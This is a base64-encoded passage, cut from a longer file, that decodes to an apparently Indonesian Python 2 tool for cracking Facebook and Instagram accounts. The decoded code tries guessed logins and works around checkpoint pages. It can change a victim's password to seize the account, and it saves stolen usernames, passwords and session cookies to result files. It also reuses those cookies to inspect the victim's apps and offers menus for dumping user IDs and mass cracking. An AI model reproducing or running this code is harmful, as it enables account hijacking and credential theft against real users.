VyIikNCglpZiAiVGVtdWthbiBBa3VuIEFuZGEiIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cih1cmxQb3N0LnRleHQpKToNCgkJcHJpbnQoIlxyJXPigKIgbW9kZSBwZXNhd2F0a2FuIHNlbGFtYSA1IGRldGlrJXMiJShNKSkNCglpZiAiY191c2VyIiBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKToNCgkJaWYgIkFrdW4gQW5kYSBEaWt1bmNpIiBpbiB1cmxQb3N0LnRleHQ6DQoJCQlwcmludCgiXHIlc+KAoiBha3VuIHRlcmt1bmNpIHNlc2kgbmV3IiUoTSkpDQoJCWVsc2U6DQoJCQlsb29wKz0xDQoJCQlwcmludCgiXHIlc+KAoiBha3VuIHRpZGFrIGNoZWNrcG9pbnQsIHNpbGFoa2FuIGFuZGEgbG9naW4gIiUoSCkpDQoJCQlvcGVuKCdPSy8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQoJZWxpZiAiY2hlY2twb2ludCIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCWxvb3ArPTENCgkJdGl0bGU9cmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJlc3BvbnNlKSkNCgkJbGluazI9cmVzcG9uc2UuZmluZCgiZm9ybSIseyJtZXRob2QiOiJwb3N0In0pDQoJCWxpc3RJbnB1dD1bJ2ZiX2R0c2cnLCdqYXpvZXN0JywnY2hlY2twb2ludF9kYXRhJywnc3VibWl0W0NvbnRpbnVlXScsJ25oJ10NCgkJZm9yIHggaW4gcmVzcG9uc2UoImlucHV0Iik6DQoJCQlpZiB4LmdldCgibmFtZSIpIGluIGxpc3RJbnB1dDoNCgkJCQlkYXRhMi51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KCQlhbj1zZXNzaW9uLnBvc3QodXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXRhMikNCgkJcmVzcG9uc2UyPXBhcnNlcihhbi50ZXh0LCJodG1sLnBhcnNlciIpDQoJCWNlaz1bY2VrIGZvciBjZWsgaW4gcmVzcG9uc2UyLmZpbmRfYWxsKCJvcHRpb24iKV0NCgkJbnVtYmVyPTANCgkJcHJpbnQoIlxyJXMlcyVzIHRlcmRhcGF0ICVzJXMlcyBvcHNpICVzOiIlKFUsdGlsLE8sUCxzdHIobGVuKGNlaykpLE8sTSkpO2plZGEoMC4wNykNCgkJaWYobGVuKGNlayk9PTApOg0KCQkJaWYgIkxpaGF0IGRldGFpbCBsb2dpbiB5YW5nIGRpdGFtcGlsa2FuLiBJbmkgQW5kYT8iIGluIHRpdGxlOg0KCQkJCWNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQoJCQkJaWYgInkiIGluIHViYWhfcGFzczoNCgkJCQkJdWJhaF9wdyh1c2VyLHB3LHNlc3Npb24scmVzcG9uc2UsbGluazIpDQoJCQkJZWxzZToNCgkJCQkJcHJpbnQoIlxyJXMlcyBha3VuIG9uZSB0YWIsIHNpbGFoa2FuIGFuZGEgbG9naW4JCSIlKEgsdGlsKSkNCgkJCQkJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3LGNva2kpKQ0KCQkJCQlhcGxpa2FzaShjb2tpKQ0KCQkJZWxpZiAiTWFzdWtrYW4gS29kZSBNYXN1ayB1bnR1ayBNZWxhbmp1dGthbiIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJlc3BvbnNlKSk6DQoJCQkJcHJpbnQoIlxyJXPigKIgYWt1biB0ZXJwYXNhbmcgYXV0ZW50aWthc2kgZHVhIGZha3RvcgkJCSIlKE0pKQ0KCQkJZWxzZToNCgkJCQlwcmludCgiJXMlcyB0ZXJqYWRpIGtlc2FsYWhhbiIlKE0sdGlsKSkNCgkJZWxpZihsZW4oY2VrKTw9MSk6DQoJCQlmb3IgeCBpbiByYW5nZShsZW4oY2VrKSk6DQoJCQkJbnVtYmVyKz0xDQoJCQkJb3BzaT1yZS5maW5kYWxsKCdcPG9wdGlvbiBzZWxlY3RlZD1cIi4qP1wiIHZhbHVlPVwiLio/XCI+KC4qPyk8XC9vcHRpb24+JyxzdHIoY2VrKSkNCgkJCQlqYWxhbiAoIiAgJXMlcy4gJXMlcyIlKFAsc3RyKG51bWJlciksSyxvcHNpWzBdKSkNCgkJZWxpZihsZW4oY2VrKT49Mik6DQoJCQlmb3IgeCBpbiByYW5nZShsZW4oY2VrKSk6DQoJCQkJbnVtYmVyKz0xDQoJCQkJb3BzaT1yZS5maW5kYWxsKCdcPG9wdGlvbiB2YWx1ZT1cIi4rXCI+KC4rKTxcL29wdGlvbj4nLHN0cihjZWtbeF0pKQ0KCQkJCWphbGFuICgiICAlcyVzLiAlcyVzIiUoUCxzdHIobnVtYmVyKSxLLG9wc2lbMF0pKQ0KCQllbHNlOg0KCQkJaWYgImNfdXNlciIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCQkJcHJpbnQoIlxyJXPigKIgYWt1biB0aWRhayBjaGVja3BvaW50LCBzaWxhaGthbiBhbmRhIGxvZ2luICIlKEgpKQ0KCQkJCW9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3KSkNCgllbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJlc3BvbnNlKToNCgkJb2ggPSBydW4uZmluZCgiZGl2Iix7ImlkIjoibG9naW5fZXJyb3IifSkuZmluZCgiZGl2IikudGV4dA0KCQlwcmludCgiJXPigKIgJXMiJShNLG9oKSkNCgllbHNlOg0KCQlsb29wKz0xDQoJCXByaW50KCIlcyVzIGxvZ2luIGdhZ2FsLCBzaWxhaGthbiBjZWsga2VtYmFsaSBpZCBkYW4ga2F0YSBzYW5kaSIlKE0sdGlsKSkNCmRlZiB1YmFoX3B3KHVzZXIscHcsc2Vzc2lvbixyZXNwb25zZSxsaW5rMik6DQoJZGF0LGRhdDI9e30se30NCglidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KCWZvciB4IGluIHJlc3BvbnNlKCJpbnB1dCIpOg0KCQlpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCgkJCWRhdC51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KCXViYWhQdz1zZXNzaW9uLnBvc3QodXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCglyZXNVYmFoPXBhcnNlcih1YmFoUHcsImh0bWwucGFyc2VyIikNCglsaW5rMz1yZXNVYmFoLmZpbmQoImZvcm0iLHsibWV0aG9kIjoicG9zdCJ9KQ0KCWJ1dDI9WyJzdWJtaXRbTmV4dF0iLCJuaCIsImZiX2R0c2ciLCJqYXpvZXN0Il0NCglpZiAiQnVhdCBLYXRhIFNhbmRpIEJhcnUiIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cih1YmFoUHcpKToNCgkJZm9yIGIgaW4gcmVzVWJhaCgiaW5wdXQiKToNCgkJCWlmIGIuZ2V0KCJuYW1lIikgaW4gYnV0MjoNCgkJCQlkYXQyLnVwZGF0ZSh7Yi5nZXQoIm5hbWUiKTpiLmdldCgidmFsdWUiKX0pDQoJCWRhdDIudXBkYXRlKHsicGFzc3dvcmRfbmV3IjoiIi5qb2luKHB3YmFydSl9KQ0KCQlhbj1zZXNzaW9uLnBvc3QodXJsK2xpbmszLmdldCgiYWN0aW9uIiksZGF0YT1kYXQyKQ0KCQljb2tpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KCQlwcmludCgiXHIlcyVzIGFrdW4gb25lIHRhYiwgc2FuZGkgYmVyaGFzaWwgZGkgdWJhaCBcbiAqLS0+ICVzIOKXiiAlcyDil4ogJXMJCQkiJShILHRpbCx1c2VyLHB3YmFydVswXSxjb2tpKSkNCgkJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3YmFydVswXSxjb2tpKSkNCgkJYXBsaWthc2koY29raSkNCmRlZiBhcGxpa2FzaShrdWtpKToNCglzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCglydW4gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIpDQoJcnVuXyA9ICgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9aW5hY3RpdmUiKQ0KCW90dyA9IHNlcy5nZXQocnVuLGNvb2tpZXM9eydjb29raWUnOmt1a2l9KQ0KCW90d18gPSBzZXMuZ2V0KHJ1bl8sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQoJZ2VtID0gcGFyc2VyKG90dy5jb250ZW50LCdodG1sLnBhcnNlcicpDQoJZ2VtXyA9IHBhcnNlcihvdHdfLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykNCglhcGsgPSBnZW0uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCglhcGtfID0gZ2VtXy5maW5kKCdmb3JtJyxtZXRob2Q9J3Bvc3QnKQ0KCW5vID0gMA0KCW5vXyA9IDANCgl0cnk6DQoJCWZvciBhcHAgaW4gYXBrLmZpbmRfYWxsKCJoMyIpOg0KCQkJZGF0YSA9IGFwcC5maW5kKCdzcGFuJykudGV4dA0KCQkJbm8rPTENCgkJCWphbGFuKCIgICVzJXMuICVzJXMgIiUoUCxzdHIobm8pLEgsZGF0YSkpDQoJCWZvciBhcHBfIGluIGFwa18uZmluZF9hbGwoImgzIik6DQoJCQlkYXRhXyA9IGFwcF8uZmluZCgnc3BhbicpLnRleHQNCgkJCW5vXys9MQ0KCQkJamFsYW4oIiAgJXMlcy4gJXMlcyAiJShQLHN0cihub18pLE0sZGF0YV8pKQ0KCWV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoNCgkJcHJpbnQgKCIlc+KAoiBnYWdhbCBtZW5kZXRla3NpIiUoTSkpDQoNCiMgTUVOVSBJTkkgQUpHDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCWZvbGRlcigpDQoJdHJ5Og0KCQlsaXMgPSBvcGVuICgiZGF0YS9saXNlbnNpLnR4dCIsInIiKS5yZWFkKCkNCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIik7cHJpbnQgKCIlc+KAoiBMaXNlbnNpIGthZGFsdWFyc2EiJShNKSk7amVkYSgyKQ0KCQlvcy5zeXN0ZW0oInJtIC1yZiBkYXRhL2xpc2Vuc2kudHh0IikNCgkJa2V5KCkua29uZmlybWFzaSgpDQoJaWYgb3MucGF0aC5leGlzdHMoJ2RhdGEvbGlzZW5zaS50eHQnKToNCgkJdHJ5Og0KCQkJbGlzID0gb3BlbignZGF0YS9saXNlbnNpLnR4dCcsICdyJykucmVhZCgpDQoJCQlnaXQgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ2l0aHViLmNvbS93YXJiYTI5L2xpc2Vuc2kvYmxvYi9tYWluL2lkLnR4dCcpLnRleHQuc3RyaXAoKQ0KCQkJaWYgbGlzIGluIGdpdDoNCgkJCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJCQliYW5uZXIoKQ0KCQkJCXByaW50KCJcbiIpDQoJCQkJcyA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQ0KCQkJCWZvciBtIGluIHM6DQoJCQkJCXByaW50ICdcclx4MWJbMTs5NW3igKJceDFiWzE7OTZtIE1lbWVyaWtzYSBsaXNlbnNpICcgKyBtLA0KCQkJCQlzeXMuc3Rkb3V0LmZsdXNoKCk7amVkYSgxKQ0KCQkJCWphbGFuKCdcbiVz4oCiIExpc2Vuc2kgdGVyc2VkaWEg4oiaJyUoSCkpO2plZGEoMSk7b3Muc3lzdGVtKCdjbGVhcicpDQoJCQllbHNlOg0KCQkJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQkJCWJhbm5lcigpDQoJCQkJcHJpbnQoIlxuIikNCgkJCQlzID0gWycuICAgJywgJy4uICAnLCAnLi4uICddDQoJCQkJZm9yIG0gaW4gczoNCgkJCQkJcHJpbnQgJ1xyXHgxYlsxOzk1beKAolx4MWJbMTs5Nm0gTWVtZXJpa3NhIGxpc2Vuc2kgJyArIG0sDQoJCQkJCXN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDEpDQoJCQkJamFsYW4oJ1xuJXPigKIgTGlzZW5zaSB0aWRhayB0ZXJzZWRpYSclKE0pKTtqZWRhKDEpDQoJCQkJa2V5KCkua29uZmlybWFzaSgpDQoJCWV4Y2VwdCBJT0Vycm9yOg0KCQkJb3Muc3lzdGVtKCJybSAtcmYgZGF0YS9saXNlbnNpLnR4dCIpDQoJCQlrZXkoKS5rb25maXJtYXNpKCkNCgllbHNlOg0KCQlrZXkoKS5rb25maXJtYXNpKCkNCgl0cnk6DQoJCXJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcsICdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50ICgiJXMlcyBPcHMgYW5kYSBiZWx1bSBsb2dpbiAiJShNLHRpbCkpO2plZGEoMik7b3Muc3lzdGVtKCdybSAtcmYgZGF0YS90b2tlbi50eHQgJiYgcm0gLXJmIGRhdGEvY29va2llcycpO21hc3VrKCkNCgl0cnk6DQoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3JvbXosaGVhZGVycz1oZWFkZXIpDQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJbmFtYSA9IGFbIm5hbWUiXQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQgKCIlcyVzIFRva2VuIGludmFsaWQgIiUoTSx0aWwpKTtqZWRhKDIpO29zLnN5c3RlbSgncm0gLXJmIGRhdGEvdG9rZW4udHh0ICYmIHJtIC1yZiBkYXRhL2Nvb2tpZXMnKTttYXN1aygpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlleGl0KCdcblxuJXMlcyB0aWRhayBhZGEga29uZWtzaSVzXG4nJShNLHRpbCxOKSkNCgliYW5uZXIoKQ0KCXByaW50ICgnJXMgIyAlc05hbWUgJXM6ICVzJXMlcyBcbiclKFUsTyxNLEgsbmFtYSxPKSkNCglwcmludCAoJyVz4oCiJXMgMDEgJXNEdW1wIGlkIHB1YmxpYyclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDIgJXNEdW1wIGlkIGZvbGxvd2VycyclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDMgJXNEdW1wIGlkIHJlYWN0aW9uIHBvc3QnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA0ICVzRHVtcCBpZCBhbmdnb3RhIGdyb3VwJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAwNSAlc0R1bXAgaWQgcGVuY2FyaWFuIG5hbWEnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA2ICVzRHVtcCBpZCBwZXNhbiBtZXNlbmdnZXInJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA3ICVzRHVtcCBpZCAodW50dWsgbWVuY2FyaSBpZCBvbGQpJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAwOCAlc0NyYWNrIGZhY2Vib29rJyUoVSxQLEgpKQ0KCXByaW50ICgnJXPigKIlcyAwOSAlc0NyYWNrIGluc3RhZ3JhbSclKFUsUCxIKSkNCglwcmludCAoJyVz4oCiJXMgMTAgJXNTZXR0aW5nIHVzZXIgYWdlbnQnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDExICVzQ2VrIGhhc2lsIGNyYWNrJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAxMiAlc0NlayBvcHNpIGFrdW4nJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDEzICVzSW5mbyBzY3JpcHQnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIHJtICVzSGFwdXMgYWt1biclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDAgJXNLZWx1YXInJShVLE0sTykpDQoJc2x1dCA9IHJhd19pbnB1dCgnXG4lcyMgJXNQaWxpaCAlcz4gJXMnJShQLE8sTSxLKSkNCglqaWVoKHNsdXQscm9teikNCmRlZiBqaWVoKHNsdXQscm9teik6DQogICAgaWYgc2x1dCA9PSAnJzoNCiAgICAgICAgcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgIGVsaWYgc2x1dCBpblsnMScsJzAxJ106DQogICAgCWdhbiA9IHJhd19pbnB1dCAoIlxuJXMlcyVzIGFwYWthaCBhbmRhIGluZ2luIGdhbmRha2FuIGlkPyB5L3QlcyA+JXMgIiUoVSx0aWwsTyxNLEspKQ0KICAgICAgICBpZiBnYW4gaW5bIiJdOg0KICAgICAgICAJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgICAgICBlbGlmIGdhbiBpblsneScsJ1knXToNCiAgICAgICAgCW1hc3NhbChyb216KQ0KICAgICAgICBlbGlmIGdhbiBpblsndCcsJ1QnXToNCiAgICAgICAgCXB1Ymxpayhyb216KQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgIGVsaWYgc2x1dCBpblsnMicsJzAyJ106DQogICAgICAgIGZvbGxvd2Vycyhyb216KQ0KICAgIGVsaWYgc2x1dCBpblsnMycsJzAzJ106DQogICAgICAgIHBvc3Rpbmdhbihyb216KQ0KICAgIGVsaWYgc2x1dCBpblsnNCcsJzA0J106DQogICAgICAgIGdyb3VwKF9fcm9tel9fKCkpDQogICAgZWxpZiBzbHV0IGluWyc1JywnMDUnXToNCiAgICAJZHVtcGZsKCk7ZXhpdCgpDQogICAgZWxpZiBzbHV0IGluWyc2JywnMDYnXToNCiAgICAJcGVzYW4oX19yb216X18oKSkNCiAgICBlbGlmIHNsdXQgaW5bJzcnLCcwNyddOg0KICAgIAlkdW1wX2lkKCkucGlsaWhhbigpDQogICAgZWxpZiBzbHV0IGluWyc4JywnMDgnXToNCiAgICAgICAgbmdlbnRvZCgpLnJvbWl5KCkNCiAgICBlbGlmIHNsdXQgaW5bJzknLCcwOSddOg0KICAgIAlpZ2coKQ0KICAgIGVsaWYgc2x1dCBpblsnMTAnXToNCiAgICAJdXNlcmFnZW50KCkNCiAgICBlbGlmIHNsdXQgaW5bJzExJ106DQogICAgCXByaW50ICgiXG4lcyVzJXMgMDEgJXNDZWsgaGFzaWwgYWt1biBmYWNlYm9vayAiJShVLHRpbCxQLE8pKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyAwMiAlc0NlayBoYXNpbCBha3VuIGluc3RhZ3JhbSAiJShVLHRpbCxQLE8pKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyAwMyAlc0hhcHVzIGhhc2lsIGNyYWNrICIlKFUsdGlsLFAsTykpDQogICAgICAgIHByaW50ICgiJXMlcyVzIDAwICVzS2VtYmFsaSAiJShVLHRpbCxNLE8pKQ0KICAgICAgICByb20gPSByYXdfaW5wdXQoJ1xuJXMjICVzUGlsaWggJXM+ICVzJyUoUCxPLE0sSykpDQogICAgICAgIGNla19jZWsocm9tKQ0KICAgIGVsaWYgc2x1dCBpblsnMTInXToNCiAgICAJZmlsZV9jcCgpDQogICAgZWxpZiBzbHV0IGluWycxMyddOg0KICAgIAlpbmdmb2goKQ0KICAgIGVsaWYgc2x1dCBpblsncm0nLCdSbScsJ1JNJ106DQogICAgICAgIHByaW50ICgnJykNCiAgICAgICAgdGlrKCk7amVkYSgxKTtvcy5zeXN0ZW0oJ3JtIC1yZiBkYXRhL3Rva2VuLnR4dCAmJiBybSAtcmYgZGF0YS9jb29raWVzJykNCiAgICAgICAgamFsYW4oJ1xuJXMlcyBiZXJoYXNpbCB0ZXJoYXB1cyAnJShILHRpbCkpO2V4aXQoKQ0KICAgIGVsaWYgc2x1dCBpblsnMCcsJzAwJ106DQogICAgCWV4aXQoJ1xuJykNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojSEFQVVMgSEFTSUwNCmRlZiBoYXB1c19oYXNpbCgpOg0KCW9zLnN5c3RlbSgncm0gLXJmIENQLyogJiYgT0svKicpDQoJb3Muc3lzdGVtKCdybSAtcmYgb2tlaC50eHQgJiYgY2VwZWgudHh0JykNCglwcmludCAoJycpO2plZGEoMikNCglqYWxhbiAoSCsnIOKImiBiZXJoYXNpbCBtZW5naGFwdXMgaGFzaWwgY3JhY2sgJyk7amVkYSgyKQ0KCW1lbnUoKQ0KIyBDRUsgSEFTSUwNCmRlZiBoYXNpbGwoKToNCglwcmludCAoIlxuJXMlcyVzIDAxICVzQ2VrIGhhc2lsIGFrdW4gJXNPSyAiJShVLHRpbCxQLE8sSCkpDQoJcHJpbnQgKCIlcyVzJXMgMDIgJXNDZWsgaGFzaWwgYWt1biAlc0NQICIlKFUsdGlsLFAsTyxLKSkNCglwcmludCAoIiVzJXMlcyAwMCAlc0tlbWJhbGkgIiUoVSx0aWwsTSxPKSkNCmRlZiBjZWtfY2VrKHJvbSk6DQoJaWYgcm9tIGluWycnXToNCgkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KCWVsaWYgcm9tIGluWycxJywnMDEnXToNCgkJaGFzaWxfZmIoKQ0KCWVsaWYgcm9tIGluWycyJywnMDInXToNCgkJaGFzaWxfaWdlaCgpDQoJZWxpZiByb20gaW5bJzAzJywnMyddOg0KCQloYXB1c19oYXNpbCgpDQoJZWxpZiByb20gaW5bJzAnLCcwMCddOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojIENFSyBIQVNJTCBGQUNFQk9PSw0KZGVmIGhhc2lsX2ZiKCk6DQoJaGFzaWxsKCkNCglsID0gcmF3X2lucHV0KCdcbiVzIyVzIFBpbGloICVzPiAlcyAnJShQLE8sTSxLKSkNCglpZiBsIGluWycnXToNCgkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KCWVsaWYgbCBpblsnMScsJzAxJ106DQoJCWRpcnMgPSBvcy5saXN0ZGlyKCdPSycpDQoJCXByaW50ICgiXG4lc+KAoiVzIFslcyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiAlc11cbiIlKFUsTyxVLE8pKQ0KCQlmb3IgZmlsZSBpbiBkaXJzOg0KCQkJcHJpbnQoIiVz4oCiJXM+ICVzJXMiJShVLE0sSCxmaWxlKSk7amVkYSgwLjA3KQ0KCQl0cnk6DQoJCQlmaWxlID0gcmF3X2lucHV0KCJcbiVz4oCiJXMgbWFzdWthbiBmaWxlICVzOiVzICIlKFUsTyxNLEgpKTtqZWRhKDAuMikNCgkJCWlmIGZpbGUgaW5bJyddOg0KCQkJCWV4aXQoIiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCIlKE0pKQ0KCQkJdG90YWxvayA9IG9wZW4oJ09LLyVzJyAlIGZpbGUpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCgkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQlwcmludCgiJXMlcyBmaWxlIHRpZGFrIGFkYSAiJShNLHRpbCkpDQoJCW5tX2ZpbGUgPSAoJyVzJyAlIGZpbGUpLnJlcGxhY2UoJy0nLCAnICcpDQoJCWZpbGVfbm0gPSBubV9maWxlLnJlcGxhY2UoJy50eHQnLCAnJykNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCQlqYWxhbigiJXPigKIlcyBoYXNpbCB0YW5nZ2FsJXMgOiAlcyVzICVzdG90YWwgJXM6ICVzJXMiJShVLE8sTSxILGZpbGVfbm0sTyxNLEgsbGVuKHRvdGFsb2spKSkNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSCkpO2plZGEoMikNCgkJb3Muc3lzdGVtKCdjYXQgT0svJXMnICUgZmlsZSkNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCQlleGl0KCdcbicpDQoJZWxpZiBsIGluWycyJywnMDInXToNCgkJZGlycyA9IG9zLmxpc3RkaXIoJ0NQJykNCgkJcHJpbnQgKCJcbiVz4oCiJXMgWyVzIGhhc2lsIGNyYWNrIHlhbmcgdGVyc2ltcGFuICVzXVxuIiUoVSxPLFUsTykpDQoJCWZvciBmaWxlIGluIGRpcnM6DQoJCQlwcmludCgiJXPigKIlcz4gJXMlcyIlKFUsTSxLLGZpbGUpKTtqZWRhKDAuMDcpDQoJCXRyeToNCgkJCWZpbGUgPSByYXdfaW5wdXQoIlxuJXPigKIlcyBtYXN1a2FuIGZpbGUgJXM6JXMgIiUoVSxPLE0sSykpO2plZGEoMC4yKQ0KCQkJaWYgZmlsZSBpblsnJ106DQoJCQkJZXhpdCgiJXPigKIgaXNpIHlhbmcgYmVuYXIga2VudG9kIiUoTSkpDQoJCQl0b3RhbGNwID0gb3BlbignQ1AvJXMnICUgZmlsZSkucmVhZCgpLnNwbGl0bGluZXMoKQ0KCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCXByaW50KCIlcyVzIGZpbGUgdGlkYWsgYWRhICIlKE0sdGlsKSkNCgkJbm1fZmlsZSA9ICgnJXMnICUgZmlsZSkucmVwbGFjZSgnLScsICcgJykNCgkJZmlsZV9ubSA9IG5tX2ZpbGUucmVwbGFjZSgnLnR4dCcsICcnKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjIiUoUCxNLFApKTtqZWRhKDIpDQoJCWphbGFuKCIlc+KAoiVzIGhhc2lsIHRhbmdnYWwlcyA6ICVzJXMgJXN0b3RhbCVzIDogJXMlcyIlKFUsTyxNLEssZmlsZV9ubSxPLE0sSyxsZW4odG90YWxjcCkpKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQlvcy5zeXN0ZW0oJ2NhdCBDUC8lcycgJSBmaWxlKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjIiUoUCxNLFApKTtqZWRhKDIpDQoJCWV4aXQoJ1xuJykNCgllbGlmIGwgaW5bJzAnLCcwMCddOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojIENFSyBIQVNJTCBJR0VIDQpkZWYgaGFzaWxfaWdlaCgpOg0KCWhhc2lsbCgpDQoJd2hpbGUgVHJ1ZToNCgkJcm9tID0gcmF3X2lucHV0KCdcbiVzIyAlc1BpbGloICVzPiAlcyclKFAsTyxNLEspKQ0KCQlpZiByb20gaW5bJzEnLCcwMSddOg0KCQkJdHJ5Og0KCQkJCW9rZSA9IG9wZW4oIm9rZWgudHh0IiwgInIiKS5yZWFkbGluZXMoKQ0KCQkJCXByaW50ICgiXG4lc+KAoiVzIFslcyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiAlc11cbiIlKFUsTyxVLE8pKQ